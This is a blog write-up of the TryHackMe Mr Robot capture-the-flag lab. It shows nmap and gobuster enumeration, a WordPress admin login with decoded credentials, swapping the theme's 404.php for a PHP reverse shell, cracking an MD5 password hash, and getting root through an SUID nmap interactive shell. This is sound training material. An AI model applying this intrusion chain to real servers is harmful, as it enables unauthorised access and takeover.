+++
title = "THM: Mr Robot CTF -- Write-Up"
description = "Walkthrough write-up of the TryHackMe Mr Robot CTF"
type = ["posts","post"]
tags = [
    "blog",
    "tryhackme",
    "gobuster",
    "nmap",
    "wordpress",
    "php",
]
date = "2022-05-10T23:14:00"
categories = [
    "ctf",
    "TryHackMe",
]
[ author ]
  name = "Rob"
+++


## About 
[TryHackMe.com](https://tryhackme.com/)'s [Mr Robot CTF (MRCTF)](https://tryhackme.com/room/mrrobot) is a beginner-friendly capture-the-flag virtual machine by [Leon Johnson](https://twitter.com/@sho_luv). MRCTF is named after, and inspired by, the [Mr. Robot](https://en.wikipedia.org/wiki/Mr._Robot) television show and challenges users to capture three flags by finding vulnerabilities in the target server and exploiting them to gain root access.

### Note
My instance of MRCTF was at IP address `<target-ip>`, though yours will vary. I have replaced all instances of this address with `<target-ip>` in the walkthrough portion of this write-up.

## Methodology
We begin our enumeration efforts by running an `nmap` scan on the target machine to understand the ports that are open to network traffic. I usually begin with the TCP SYN "Stealth" Scan (-sS) with "version dection" (`-V`) enabled. Here is a [list of general `nmap` CLI flags](https://nmap.org/book/port-scanning-options.html).

### nmap
```shell
nmap sudo nmap -sV -v <target-ip>

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 12:12 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:12
Scanning <target-ip> [4 ports]
Completed Ping Scan at 12:12, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:12
Completed Parallel DNS resolution of 1 host. at 12:12, 0.01s elapsed
Initiating SYN Stealth Scan at 12:12
Scanning <target-ip> [1000 ports]
Discovered open port 443/tcp on <target-ip>
Discovered open port 80/tcp on <target-ip>
Completed SYN Stealth Scan at 12:12, 9.83s elapsed (1000 total ports)
Initiating Service scan at 12:12
Scanning 2 services on <target-ip>
Completed Service scan at 12:13, 12.92s elapsed (2 services on 1 host)
NSE: Script scanning <target-ip>.
Initiating NSE at 12:13
Completed NSE at 12:13, 2.82s elapsed
Initiating NSE at 12:13
Completed NSE at 12:13, 1.27s elapsed
Nmap scan report for <target-ip>
Host is up (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
           Raw packets sent: 2007 (88.284KB) | Rcvd: 10 (416B)

```
From this, we learn that an `Apache` instance is active on the standard ports, while an ssh server is running on port 22 - though it is closed to network traffic.

Next, we use `gobuster`, [a popular tool](https://github.com/OJ/gobuster) that facilitates brute-force enumeration. Here, we use it in directory mode (`dir`) with a popular directory names wordlist (`-w`) against our `<target-ip>` with (`-u`).

### gobuster
```shell
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <target-ip>

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<target-ip>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/10 12:13:27 Starting gobuster in directory enumeration mode
===============================================================

/.hta                 (Status: 403) [Size: 213]

/.htaccess            (Status: 403) [Size: 218]

/.htpasswd            (Status: 403) [Size: 218]

/0                    (Status: 301) [Size: 0] [--> http://<target-ip>/0/]

/admin                (Status: 301) [Size: 235] [--> http://<target-ip>/admin/]

/atom                 (Status: 301) [Size: 0] [--> http://<target-ip>/feed/atom/]

/audio                (Status: 301) [Size: 235] [--> http://<target-ip>/audio/]  

/blog                 (Status: 301) [Size: 234] [--> http://<target-ip>/blog/]   

/css                  (Status: 301) [Size: 233] [--> http://<target-ip>/css/]    

/dashboard            (Status: 302) [Size: 0] [--> http://<target-ip>/wp-admin/] 

/favicon.ico          (Status: 200) [Size: 0]                                      

/feed                 (Status: 301) [Size: 0] [--> http://<target-ip>/feed/]     

/image                (Status: 301) [Size: 0] [--> http://<target-ip>/image/]    

/Image                (Status: 301) [Size: 0] [--> http://<target-ip>/Image/]    

/images               (Status: 301) [Size: 236] [--> http://<target-ip>/images/] 

/index.html           (Status: 200) [Size: 1188]                                   

/index.php            (Status: 301) [Size: 0] [--> http://<target-ip>/]          

/intro                (Status: 200) [Size: 516314]                                 

/js                   (Status: 301) [Size: 232] [--> http://<target-ip>/js/]     

/license              (Status: 200) [Size: 309]                                    

/login                (Status: 302) [Size: 0] [--> http://<target-ip>/wp-login.php]

/page1                (Status: 301) [Size: 0] [--> http://<target-ip>/]            

/phpmyadmin           (Status: 403) [Size: 94]                                       

/readme               (Status: 200) [Size: 64]                                       

/rdf                  (Status: 301) [Size: 0] [--> http://<target-ip>/feed/rdf/]   

/robots               (Status: 200) [Size: 41]                                       

/robots.txt           (Status: 200) [Size: 41]                                       

/rss                  (Status: 301) [Size: 0] [--> http://<target-ip>/feed/]       

/rss2                 (Status: 301) [Size: 0] [--> http://<target-ip>/feed/]       

/sitemap              (Status: 200) [Size: 0]                                        

/sitemap.xml          (Status: 200) [Size: 0]                                        

/video                (Status: 301) [Size: 235] [--> http://<target-ip>/video/]    

/wp-admin             (Status: 301) [Size: 238] [--> http://<target-ip>/wp-admin/] 

/wp-content           (Status: 301) [Size: 240] [--> http://<target-ip>/wp-content/]

/wp-includes          (Status: 301) [Size: 241] [--> http://<target-ip>/wp-includes/]

/wp-cron              (Status: 200) [Size: 0]                                          

/wp-config            (Status: 200) [Size: 0]                                          

/wp-links-opml        (Status: 200) [Size: 227]                                        

/wp-load              (Status: 200) [Size: 0]                                          

/wp-login             (Status: 200) [Size: 2613]                                       

/wp-mail              (Status: 500) [Size: 3064]                                       

/wp-settings          (Status: 500) [Size: 0]                                          

/wp-signup            (Status: 302) [Size: 0] [--> http://<target-ip>/wp-login.php?action=register]

/xmlrpc               (Status: 405) [Size: 42]                                                       

/xmlrpc.php           (Status: 405) [Size: 42]                                                       
===============================================================
2022/05/10 12:24:21 Finished
===============================================================
```
From this, we can be confident that WordPress is installed. This also mirrors what [Wappalyzer]() tells us about the server's WordPress installation. Let's investigate some of the more interesting results from our `gobuster` scan.

Visiting `http://<target-ip>/robots.txt` yields:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`fsocity.dic` is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.

`key-1-of-3.txt` has our first flag.

`http://<target-ip>/license` gives us a text file with the following string hidden at the bottom. At first flance, the string looks a lot like `base64`, so let us try to convert it. This could be done via websites like [www.base64.decode.org](https://www.base64decode.org/), but I already had Burp Suite open. It works:

![mr-robot-burp-decode](/images/mr-robot/mr-robot-burp-decode.png)

and gives us a `user:password` combination.

Looking through our `gobuster` results, we see `http://<target-ip>/wp-login.php`, which takes us to a WordPress log-in form. Using the credentials we have just discovered, we log in to the administrator panel.

As WordPress is a multi-media content management system, it should not be too difficult for us to figure out a way to upload a file that will give us RCE (remote code execution). In the past, we have used [Pentestmonkey's PHP reverse shell script](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Unfortunately, the native WordPress media uploader function does not allow us to upload `.php` files "for security reasons." The form won't accept any variants like `.php2` either.

However, we know that WordPress relies on the execution of `.php` files to carry out work properly. Thus, we can simply use the platform's built-in text editor to replace the contents of an existing `.php` WordPress page with our reverse shell script. I went ahead and used `404.php`, as it is easily accessible and, honestly, it's just at the top of the list.

![mr-robot-ptm](/images/mr-robot/mr-robot-ptm.png)

That worked nicely! We can then stabilize our shell via python with:

```shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ 
```

and explore:

```shell
daemon@linux:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
daemon@linux:/$ cd home 
cd home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt	password.raw-md5
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We can't read `key-2-of-3.txt` yet, but we can access `password.raw-md5` for a hashed version of a password, likely for the `robot` user. We can use [crackstation.net](https://crackstation.net/) to crack it, and, if not, probaby [John the Ripper](https://www.openwall.com/john/).

Luckily, crackstation.net recognizes the hash and gives us the decoded password:

![mr-robot-crackstation](/media/mr-robot-crackstation.png)

We can now switch users (`su`) to `robot` and read `key-2-of-3.txt`. Now that we have gotten the second flag, let's look to escalate our privileges for `root` access and, presumably, the third flag.

As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be `root`, it runs with root permissions.

```shell
robot@linux:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

We see that `nmap` in `/usr/local/bin/nmap`, interestingly, has an SUID bit set. Nice.

By checking [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid) for `nmap` SUID escalations, we see that we can invoke `nmap`'s "interactive mode" (available on versions 2.02 to 5.21, which can be used to execute shell commands via `nmap> !sh`.

```shell
robot@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !/bin/sh
!/bin/sh
# whoami
whoami
root
# 
```

...*et voilà*! We have root access and, by extension, the third flag.

### Notes

In retrospect, I would've checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy `gobuster` scan, potentially saving time.

Otherwise, this was an enjoyable CTF machine, especially for fans of the show.